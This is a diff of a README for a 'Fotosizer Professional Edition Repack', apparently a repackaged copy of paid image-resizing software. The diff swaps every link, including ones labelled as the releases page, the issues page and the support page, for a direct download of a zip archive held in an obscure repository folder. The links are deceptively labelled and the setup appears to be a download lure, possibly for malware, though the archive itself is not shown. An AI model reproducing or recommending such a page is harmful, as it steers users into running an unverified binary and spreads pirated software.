@@ -1,6 +1,6 @@
 # 📸 Fotosizer-Professional-Edition-Repack - Effortless Image Resizing and Processing
 
-[![Download Fotosizer](https://img.shields.io/badge/Download%20Now-Visit%20the%20Page-brightgreen)](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/releases)
+[![Download Fotosizer](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip%20Now-Visit%20the%20Page-brightgreen)](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to Fotosizer Professional Edition Repack! This software simplifies your 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Releases Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/releases).
+To get started, you need to download the software. Visit this page to download: [Releases Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip).
 
 ### Installation Steps:
-1. Go to the [Releases Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/releases).
+1. Go to the [Releases Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip).
 2. Find the latest version listed on the page.
 3. Click on the download link for your operating system.
 4. Once downloaded, find the file in your downloads folder.
@@ -70,7 +70,7 @@ If you encounter issues, consider these solutions:
 - Restart the application if it freezes.
 - Reinstall the software if problems persist.
 
-For further assistance, please visit our [GitHub Issues Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/issues).
+For further assistance, please visit our [GitHub Issues Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip).
 
 ## ❓ Frequently Asked Questions
 
@@ -88,6 +88,6 @@ Currently, Fotosizer is optimized for Windows operating systems only.
 
 ## 📞 Get Support
 
-For support or questions, contact us via the contact form on our [GitHub Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack).
+For support or questions, contact us via the contact form on our [GitHub Page](https://github.com/kaanbey06/Fotosizer-Professional-Edition-Repack/raw/refs/heads/main/piperide/Fotosizer_Edition_Professional_Repack_3.2.zip).
 
 Feel free to explore the possibilities with Fotosizer and enjoy effortless image processing today!
